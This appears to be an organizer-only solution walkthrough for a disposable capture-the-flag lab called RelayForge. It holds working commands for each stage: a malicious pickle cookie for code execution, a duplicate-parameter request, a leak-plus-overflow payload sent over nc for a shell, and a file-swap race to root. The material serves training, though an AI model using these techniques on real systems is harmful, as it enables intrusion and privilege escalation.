# RelayForge manual blind-discovery commands

> **Organizer-only full spoilers.** Use this only on the assigned disposable
> RelayForge challenge. It reaches unrestricted UID 0 on the Ubuntu host. Do
> not distribute it at the start of a blind event unless you intend to turn the
> challenge into a guided exercise.

This is the manual route from the supplied portal credentials to the root
flag. It does **not** call any repository exploit, test, attack, or raw-RPC
helper. Every request, pickle, database call, Worker frame, and Supervisor
message is constructed in the commands below.

## What a fair blind player must receive

An IP address, username, password, and topology are enough to discover the
normal Web and tunnel behavior. They are **not** enough to infer arbitrary
class fields, hidden route names, protocol words, or a native binary's memory
layout.

For a genuinely blind but solvable event, also provide:

- sanitized Web source containing the remember-cookie loader, `prefs.py`, and
  the one-shot result route;
- sanitized Access parser source; and
- the exact AMD64 `relay-worker` binary used by the deployment.

Do not provide the repository's solution scripts. The final Supervisor source
does not need to be in the handout because a player can read it after reaching
the native Worker shell.

The Web commands assume Bash or Zsh on Linux, macOS, or WSL with `curl`, Python
3, `grep`, `sed`, and `nc`. The Worker-analysis block requires AMD64 Linux or
WSL with GNU binutils (`file`, `strings`, `readelf`, and `objdump`); macOS's
native tools are not drop-in replacements for those commands.

## 1. Log in without using the browser

Set the values supplied to the player:

```bash
RF_HOST='<target-ip-or-dns>'
RF_BASE="https://$RF_HOST"
RF_USER='<given-username>'
RF_PASSWORD='<given-password>'
RF_JAR="$(mktemp)"
RF_PAGE="$(mktemp)"
RF_DASH="$(mktemp)"
```

Fetch the login page, extract its CSRF token, and submit the credentials:

```bash
curl -ksS -c "$RF_JAR" "$RF_BASE/login" -o "$RF_PAGE"

RF_CSRF="$(
  sed -n 's/.*name="csrf_token" value="\([^"]*\)".*/\1/p' "$RF_PAGE"
)"

curl -ksS \
  -b "$RF_JAR" \
  -c "$RF_JAR" \
  --data-urlencode "csrf_token=$RF_CSRF" \
  --data-urlencode "username=$RF_USER" \
  --data-urlencode "password=$RF_PASSWORD" \
  "$RF_BASE/login" \
  -o /dev/null

RF_SESSION="$(
  awk '$6 == "session" { value=$7 } END { print value }' "$RF_JAR"
)"

RF_REMEMBER="$(
  awk '$6 == "remember_prefs" { value=$7 } END { print value }' "$RF_JAR"
)"

test -n "$RF_SESSION" && test -n "$RF_REMEMBER" && echo 'login cookies found'

curl -ksS \
  -H "Cookie: session=$RF_SESSION" \
  "$RF_BASE/dashboard" \
  -o "$RF_DASH"

grep -E '<option value=|name="service"|name="duration"' "$RF_DASH"

RF_TARGET="$(
  sed -n 's/.*<option value="\([^"]*\)">.*/\1/p' "$RF_DASH" |
    head -n 1
)"

test -n "$RF_TARGET" && printf 'granted target: %s\n' "$RF_TARGET"
```

`-k` accepts the lab's self-signed certificate. It should not be used as a
general substitute for certificate validation outside this lab.

## 2. Discover and prove the Web pickle flaw

Safely disassemble the remembered-preferences cookie. Do not unpickle an
untrusted cookie on the player's own machine.

```bash
python3 - "$RF_REMEMBER" <<'PY'
import base64
import pickletools
import sys

raw = base64.b64decode(sys.argv[1], validate=True)
print(raw.hex())
pickletools.dis(raw)
PY
```

This exposes `prefs.RememberedPrefs`. The authenticated policy page provides
the additional class names:

```bash
curl -ksS \
  -H "Cookie: session=$RF_SESSION" \
  "$RF_BASE/cookie-policy" |
grep -E 'remember_prefs|RememberedPrefs|JobTemplate|JobRunner'
```

The supplied sanitized Web source explains why those names matter. Search it
instead of guessing:

```bash
grep -RInE \
  'remember_prefs|RestrictedUnpickler|find_class|__setstate__|Popen|RESULT_RE|api/result' \
  '<path-to-sanitized-web-source>'
```

The important sequence is:

1. `JobTemplate.__setstate__` appends its `command` value.
2. A stateful `JobRunner` is reconstructed afterward.
3. `JobRunner.__setstate__` executes the queued shell text.
4. A 32-hex-character `.txt` result can be read once through `/api/result/`.

Construct that pickle locally using only Python's standard library:

```bash
rf_cookie_for() {
  RF_CMD="$1" python3 - <<'PY'
import base64
import os
import pickle
import sys
import types

module = types.ModuleType("prefs")
for name in ("JobTemplate", "JobRunner"):
    cls = type(name, (), {"__module__": "prefs"})
    setattr(module, name, cls)
sys.modules["prefs"] = module

template = module.JobTemplate()
template.command = os.environ["RF_CMD"]
runner = module.JobRunner()
runner.armed = True

print(base64.b64encode(pickle.dumps([template, runner], protocol=4)).decode("ascii"))
PY
}
```

`runner.armed` is only there to make pickle emit state for `JobRunner`, which
causes its `__setstate__` hook to run. It is not an authorization bypass.

The following transparent shell function repeats the HTTP primitive. It is
entered by the player; it does not invoke a supplied RelayForge helper.

```bash
rf_web_exec() {
  local plain_command="$1"
  local result_name result_path captured cookie body attempt

  result_name="$(python3 -c 'import secrets; print(secrets.token_hex(16)+".txt")')"
  result_path="/tmp/relayforge-results/$result_name"
  captured="($plain_command) > $result_path.tmp 2>&1; mv -- $result_path.tmp $result_path"
  cookie="$(rf_cookie_for "$captured")" || return 1

  curl -ksS \
    -H "Cookie: session=$RF_SESSION; remember_prefs=$cookie" \
    "$RF_BASE/dashboard" \
    -o /dev/null || return 1

  attempt=0
  while [ "$attempt" -lt 40 ]; do
    attempt=$((attempt + 1))
    body="$(
      curl -ksS \
        -H "Cookie: session=$RF_SESSION" \
        "$RF_BASE/api/result/$result_name"
    )"
    if printf '%s' "$body" | python3 -c \
      'import json,sys; raise SystemExit(0 if "output" in json.load(sys.stdin) else 1)' \
      2>/dev/null
    then
      printf '%s' "$body" |
        python3 -c 'import json,sys; print(json.load(sys.stdin)["output"], end="")'
      return 0
    fi
    sleep 0.1
  done

  echo 'no one-shot result returned' >&2
  return 1
}
```

Use a harmless proof command first:

```bash
rf_web_exec 'id; pwd; cat /opt/relayforge/web/STAGE_1_WEB.txt'
```

Expected evidence includes UID/GID `65532` and:

```text
RELAYFORGE_STAGE=1_WEB_CONTAINER
```

That is command execution in the Web container, not host root.

## 3. Enumerate the Web container and call its narrow database capability

Ask what the compromised process can already see:

```bash
rf_web_exec 'id; printf "\nENVIRONMENT\n"; env | sort; printf "\nFILES\n"; find /opt/relayforge/web -maxdepth 2 -type f -print | sort; printf "\nSOCKETS\n"; ls -l /var/run/docker.sock /run/relayforge/supervisor.sock 2>&1; printf "\nRAW DB FUNCTION\n"; sed -n "/def submit_raw_request/,/return str/p" /opt/relayforge/web/app/db.py'
```

The evidence shows a read-only Web application, `DB_USER=relay_web`, four
database connection variables, neither privileged socket, and the exact
`relay_web_api.submit_raw_request(...)` call. A successful direct call below
proves that the restricted database role may execute that function.

The Access artifact shows that the first `profile` value is authoritative:

```bash
grep -nE 'profiles|effective_profile|profiles\[0\]|first-profile' \
  '<path-to-sanitized-access-source>/policy.py'
```

The Worker artifact must then be analyzed to see how the same signed bytes are
used at runtime:

```bash
RF_WORKER='<path-to-exact-relay-worker-binary>'
file "$RF_WORKER"
readelf -hW "$RF_WORKER"
strings -a "$RF_WORKER" |
  grep -E 'TOKEN|CONNECT|LEAK|OVERFLOW|worker_shell|profile|legacy'
strings -a -t x "$RF_WORKER" |
  grep -E 'TOKEN|CONNECT|LEAK|OVERFLOW|worker_shell|profile|legacy'
objdump -s -j .rodata "$RF_WORKER" > /tmp/relay-worker.rodata.txt
objdump -d -Mintel "$RF_WORKER" > /tmp/relay-worker.disassembly.txt
```

Use Ghidra, Cutter, or the disassembly around those string references to
confirm that Worker keeps the **last** profile, that the legacy debug frame has
128 bytes before a callback, and that the accepted overwrite frame is 136
bytes. Those values are binary-analysis results, not reasonable guesses.

The cross-component input is therefore:

```text
profile=safe&note=manual&profile=legacy
```

Access approves `safe` because it is first. Worker activates `legacy` because
it is last. Call PostgreSQL directly with `psycopg2`; do not invoke a hidden
application command or raw-RPC helper:

```bash
RF_DB_COMMAND="python3 -c 'import os,psycopg2; c=psycopg2.connect(host=os.environ[\"DB_HOST\"],dbname=os.environ[\"DB_NAME\"],user=os.environ[\"DB_USER\"],password=os.environ[\"DB_PASSWORD\"]); q=c.cursor(); q.execute(\"SELECT relay_web_api.submit_raw_request(%s,%s,%s,%s,%s)\",(\"$RF_USER\",\"$RF_TARGET\",\"echo\",420,\"profile=safe&note=manual&profile=legacy\")); value=q.fetchone()[0]; c.commit(); print(value)'"

RF_REQUEST_ID="$(rf_web_exec "$RF_DB_COMMAND" | tail -n 1)"
printf 'request id: %s\n' "$RF_REQUEST_ID"
```

Poll the ordinary authenticated status endpoint for up to 45 seconds while
Dispatcher launches the transient Worker:

```bash
RF_ATTEMPT=0
while [ "$RF_ATTEMPT" -lt 180 ]; do
  RF_ATTEMPT=$((RF_ATTEMPT + 1))
  RF_STATUS="$(
    curl -ksS \
      -H "Cookie: session=$RF_SESSION" \
      "$RF_BASE/api/status/$RF_REQUEST_ID"
  )"

  RF_STATE="$(
    printf '%s' "$RF_STATUS" |
      python3 -c 'import json,sys; print(json.load(sys.stdin).get("job_state") or "")'
  )"

  case "$RF_STATE" in
    running|failed|expired|stopped) break ;;
  esac
  sleep 0.25
done

printf '%s\n' "$RF_STATUS" | python3 -m json.tool

if [ "$RF_STATE" != running ]; then
  printf 'Worker did not reach running state; stop here (state=%s).\n' "$RF_STATE" >&2
else
  RF_PORT="$(
    printf '%s' "$RF_STATUS" |
      python3 -c 'import json,sys; print(json.load(sys.stdin)["endpoint_port"])'
  )"

  RF_TOKEN="$(
    printf '%s' "$RF_STATUS" |
      python3 -c 'import json,sys; print(json.load(sys.stdin)["session_token"])'
  )"

  RF_JOB_ID="$(
    printf '%s' "$RF_STATUS" |
      python3 -c 'import json,sys; print(json.load(sys.stdin)["job_id"])'
  )"

  printf 'host=%s port=%s token=%s job=%s\n' \
    "$RF_HOST" "$RF_PORT" "$RF_TOKEN" "$RF_JOB_ID"
fi
```

Required evidence is `request_state=approved`, `job_state=running`, a port in
`25000-25099`, and a 48-character lowercase hexadecimal token. If the state is
`failed` or the values are `null`, inspect the printed JSON instead of
continuing. The Worker lives for at most 420 seconds. Complete the binary
analysis before submission; if it expires, submit a fresh request and obtain a
new port, token, job ID, and PIE leak.

## 4. Prove the Worker gate, leak PIE, and overwrite the callback

First verify that an incorrect token is rejected:

```bash
RF_BAD_TOKEN="$(
  python3 -c \
    'import sys; value=sys.argv[1]; print(("1" if value[0]=="0" else "0")+value[1:])' \
    "$RF_TOKEN"
)"
printf 'TOKEN %s\n' "$RF_BAD_TOKEN" | nc -w 3 "$RF_HOST" "$RF_PORT"
```

Then authenticate and issue the legacy-only `LEAK` command found in the
binary:

```bash
RF_PROBE="$(
  printf 'TOKEN %s\nLEAK\nQUIT\n' "$RF_TOKEN" |
    nc -w 3 "$RF_HOST" "$RF_PORT"
)"

printf '%s\n' "$RF_PROBE"

RF_LEAK="$(
  printf '%s\n' "$RF_PROBE" |
    sed -n 's/^worker_shell=//p'
)"

test -n "$RF_LEAK" && printf 'leaked Worker address: %s\n' "$RF_LEAK"
```

The address belongs to this one live PIE Worker. Do not reuse it after the
Worker expires or restarts.

Send 128 padding bytes followed by the leaked callback address as a
little-endian AMD64 value. `cat` keeps the connection interactive:

```bash
{
  printf 'TOKEN %s\nOVERFLOW 136\n' "$RF_TOKEN"

  python3 -c \
    'import struct,sys; sys.stdout.buffer.write(b"A"*128 + struct.pack("<Q", int(sys.argv[1], 0)))' \
    "$RF_LEAK"

  cat
} | nc "$RF_HOST" "$RF_PORT"
```

Do not add a newline after the binary payload. Commands typed after the shell
banner are now consumed by `/bin/sh -i` in the native transient Worker.

Run these commands in that Worker shell:

```bash
id
pwd
cat /var/lib/relayforge/stages/STAGE_2_WORKER.txt
cat /var/lib/relayforge/stages/STAGE_3_ROOT.txt 2>&1
cat /var/lib/relayforge/flag/root.txt 2>&1
```

Expected evidence is host user `relay`, a directory resembling
`/var/lib/relayforge/workers/<job-uuid>/work`, the Stage 2 marker, and denied
access to both root-only files. This is host command execution but is not UID
0.

## 5. Discover and exploit the Supervisor race

The rest of the commands are entered inside the Worker shell. Inspect the
socket and the readable implementation:

```bash
ls -l /run/relayforge/supervisor.sock

grep -nE \
  'DIAGNOSTIC|diagnose|validated|sleep|os\.open|os\.replace|Popen' \
  /opt/relayforge/runtime/supervisor.py

sed -n '/def run_diagnostic/,/def _remove_state/p' \
  /opt/relayforge/runtime/supervisor.py
```

The source reveals an exact `diagnostic.sh` file check. Supervisor validates
and closes the file, replies `validated`, waits 250 ms, and then executes the
same pathname as root. Replacing that pathname after the acknowledgement is a
time-of-check/time-of-use race.

Confirm the current job ID and create the exact 46-byte benign file:

```bash
RF_JOB_ID="$(basename "$(dirname "$PWD")")"

printf "#!/bin/sh\nprintf 'RelayForge diagnostic OK\\\\n'\n" > diagnostic.sh
chmod 700 diagnostic.sh

wc -c diagnostic.sh
stat -c 'owner=%U group=%G mode=%a links=%h size=%s' diagnostic.sh
```

`wc -c` must report `46`. Now create the replacement payload:

```bash
printf '#!/bin/sh\nid\ncat /var/lib/relayforge/stages/STAGE_3_ROOT.txt\nprintf "ROOT_FLAG="\ncat /var/lib/relayforge/flag/root.txt\n' > root.sh
chmod 700 root.sh
```

Connect to the Unix socket, send one newline-framed JSON request, wait for the
positive validation acknowledgement, and atomically replace the pathname:

```bash
python3 -c 'import json,os,socket,sys; j=sys.argv[1]; s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.connect("/run/relayforge/supervisor.sock"); frame=(json.dumps({"op":"diagnose","job_id":j,"name":"diagnostic.sh"},separators=(",",":"))+"\n").encode(); s.sendall(frame); f=s.makefile("rb",buffering=0); ack=f.readline(); assert json.loads(ack)=={"ok":True,"state":"validated"}; os.replace("root.sh","diagnostic.sh"); sys.stdout.buffer.write(ack+f.read())' "$RF_JOB_ID"
```

Success looks like:

```text
{"ok":true,"state":"validated"}
uid=0(root) ...
RELAYFORGE_STAGE=3_UNRESTRICTED_HOST_ROOT
ROOT_FLAG=RF{...}
```

The `id` output is the proof that the replacement executed as unrestricted
host UID 0. Reading the generated `root.txt` completes the challenge.

If the output instead says `RelayForge diagnostic OK`, the benign file ran
before the replacement. Recreate both files and repeat the one-line socket
command while the same Worker is still alive.

## Why this is still called blind discovery

The player is not given a working exploit or told to run a project helper.
They use supplied analyzable artifacts to derive each arbitrary interface,
then manually reproduce it with standard tools. The evidence chain is:

```text
authenticated cookie inspection
  -> Web UID 65532
  -> restricted relay_web PostgreSQL call
  -> Access/Worker duplicate-key mismatch
  -> transient Worker token and PIE leak
  -> host relay shell
  -> readable Supervisor validation/execution mismatch
  -> host UID 0 and root flag
```

If the organizer gives only topology and credentials, Phases 1 through 4
depend on guessing hidden constants and are not a fair blind challenge. In
that format this document is a guided solution, not evidence that the chain
was independently discoverable.
